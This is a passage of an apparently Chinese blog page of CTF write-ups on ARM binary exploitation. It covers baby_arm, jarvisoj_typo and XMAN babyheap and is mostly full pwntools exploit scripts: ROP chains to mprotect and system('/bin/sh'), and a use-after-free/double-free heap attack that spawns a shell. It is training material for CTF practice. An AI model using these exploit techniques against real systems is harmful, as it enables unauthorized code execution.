operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X19 , X20 (sp+0x10) ldp    x19, x20, [sp, #0x10]</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x411068</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X21 (sp+0x20) ldp    x21, x22, [sp, #0x20]</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X22</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X23  (sp+0x30) ldp    x23, x24, [sp, #0x30] 执行最后ldp  x29, x30, [sp],  #0x40的这里都跳过了</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x411000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X24</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X29(sp+0x40)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x411068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X30</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x6</span> <span class="token comment" spellcheck="true"># X19 - X24</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们看到最后才执行给X30（PC）赋值的指令：不要被后面的#40迷惑，实际就是将sp开始的值赋给x29，x30.也就是deadbeef和0x4008ac</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/8.png"></div><p>执行后：正如预料，但发现同时sp抬高了0x40，那么最后那条指令还意味着，栈顶太高0x40</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/9.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/10.png"></div><p>最后跳到bss中的mprotect执行，然后再赋值onegadget。</p><p>有点像csu</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./baby_arm"</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"/lib64/libc.so.6"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./baby_arm"</span><span class="token punctuation">)</span>remote_gdb<span class="token operator">=</span><span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">get_sh</span><span class="token punctuation">(</span>other_libc <span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc    <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> other_libc <span class="token keyword">is</span> <span class="token operator">not</span> null<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> remote_gdb<span class="token punctuation">:</span>        sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/lib64"</span><span class="token punctuation">,</span> <span class="token string">"./baby_arm"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> sh    <span class="token keyword">else</span> <span class="token punctuation">:</span>        <span class="token keyword">return</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/lib64"</span><span class="token punctuation">,</span> <span class="token string">"./baby_arm"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> get_sh<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    shell_code <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    shell_code <span class="token operator">=</span> shell_code<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">'\x90'</span><span class="token punctuation">)</span>    shell_code <span class="token operator">=</span> shell_code <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    padding <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> padding <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4008CC</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># modify x30(PC) = 0x4008CC = give value to register</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X29 (sp+0)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4008AC</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X30  </span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X19 , X20 (sp+0x10) ldp    x19, x20, [sp, #0x10]</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x411068</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X21 (sp+0x20) ldp    x21, x22, [sp, #0x20]</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X22</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X23  (sp+0x30) ldp    x23, x24, [sp, #0x30]</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x411000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X24</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X29 (sp+0x40)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x411068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># X30</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x6</span> <span class="token comment" spellcheck="true"># X19 - X24</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shell_code<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x04-jarvisoj-typo"><a href="#0x04-jarvisoj-typo" class="headerlink" title="0x04 jarvisoj_typo"></a>0x04 jarvisoj_typo</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/11.png"></div><p>看到是arm 32位，没开canary。</p><h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/12.png"></div><p>loc_907后的指令没有反编译出来：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/13.png"></div><p>最后尝试栈溢出，发现有问题。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/14.png"></div><p>112位置栈溢出。同时PIE没开，bin/sh还在文件里面。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/15.png"></div><p>在构造ROP链前，复习几个寄存器的知识：R15/PC寄存器就是EIP；R1~R5是EDI、ESI、EDX、ECX、EBX：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/16.png"></div><p>使用pop {r1, pc}指令。</p><p>即rop = pop {r1,pc} + /bin/sh addr+ system addr</p><p>system地址：0x110b4<br>/bin/sh地址：0x6c384</p><p>正确的ROP：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/17.png"></div><p>rop = pop {r0,r4,pc} + /bin/sh addr + /bin/sh addr + system addr</p><p>getshell:</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/18.png"></div><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"/usr/arm-linux-gnueabi/lib/libc.so.6"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>remote_gdb<span class="token operator">=</span><span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">get_sh</span><span class="token punctuation">(</span>other_libc <span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc    <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> other_libc <span class="token keyword">is</span> <span class="token operator">not</span> null<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> remote_gdb<span class="token punctuation">:</span>        sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/arm-linux-gnueabi"</span><span class="token punctuation">,</span> <span class="token string">"./typo"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> sh    <span class="token keyword">else</span> <span class="token punctuation">:</span>        <span class="token keyword">return</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/arm-linux-gnueabi"</span><span class="token punctuation">,</span> <span class="token string">"./typo"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> get_sh<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">112</span>    payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x20904</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x6c384</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x6c384</span><span class="token punctuation">)</span>    payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x110b4</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"quit"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x05-XMAN入营-babyheap"><a href="#0x05-XMAN入营-babyheap" class="headerlink" title="0x05 XMAN入营-babyheap"></a>0x05 XMAN入营-babyheap</h1><h2 id="查看文件-2"><a href="#查看文件-2" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/19.png"></div><p>32位arm，没开PIE，GOT表可劫持，2.23 libc</p><h2 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/21/arm-jie-ti-hui-zong-yi/20.png"></div><p>UAF，没有任何条件限制。malloc没有size限制</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>UAF leak libc地址，再UAF劫持bss段数据，写heap list劫持free函数，执行system(“/bin/sh”)就可以getshell了。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>remote_gdb<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">def</span> <span class="token function">get_sh</span><span class="token punctuation">(</span>other_libc <span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc    <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> other_libc <span class="token keyword">is</span> <span class="token operator">not</span> null<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> remote_gdb<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/home/shinnosuke/Desktop/arm-pwn"</span><span class="token punctuation">,</span> <span class="token string">"./baby_heap"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span><span class="token string">"./libc.so"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> p    <span class="token keyword">else</span> <span class="token punctuation">:</span>        <span class="token keyword">return</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/arm-linux-gnueabi"</span><span class="token punctuation">,</span> <span class="token string">"./baby_heap"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span><span class="token string">"./libc.so"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># return process("./baby_heap",env={"LD_PRELOAD":"./libc.so"})</span><span class="token comment" spellcheck="true"># p = process("./baby_heap",env={"LD_PRELOAD":"./libc.so"})</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"You content:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>p <span class="token operator">=</span> get_sh<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># libc.address = data - 48 - libc.symbols["__malloc_hook"] -0x10</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> data <span class="token operator">-</span> <span class="token number">0xe87cc</span><span class="token comment" spellcheck="true">#0xf66e7b94</span><span class="token comment" spellcheck="true">#0xf66e8000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>create<span class="token punctuation">(</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token string">"\x33"</span><span class="token operator">*</span><span class="token number">0x3c</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>create<span class="token punctuation">(</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token string">"\x44"</span><span class="token operator">*</span><span class="token number">0x3c</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 4</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x3c</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x21070</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5 = 3</span>create<span class="token punctuation">(</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 6 = 4</span>create<span class="token punctuation">(</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 7 = 3</span>create<span class="token punctuation">(</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x00021014</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 8 = bss</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 9</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x06-第五空间安全大赛-pwnme"><a href="#0x06-第五空间安全大赛-pwnme" class="headerlink" title="0x06 第五空间安全大赛-pwnme"></a>0x06 第五空间安全大赛-pwnme</h1><h2 id="查看文件-3"><a 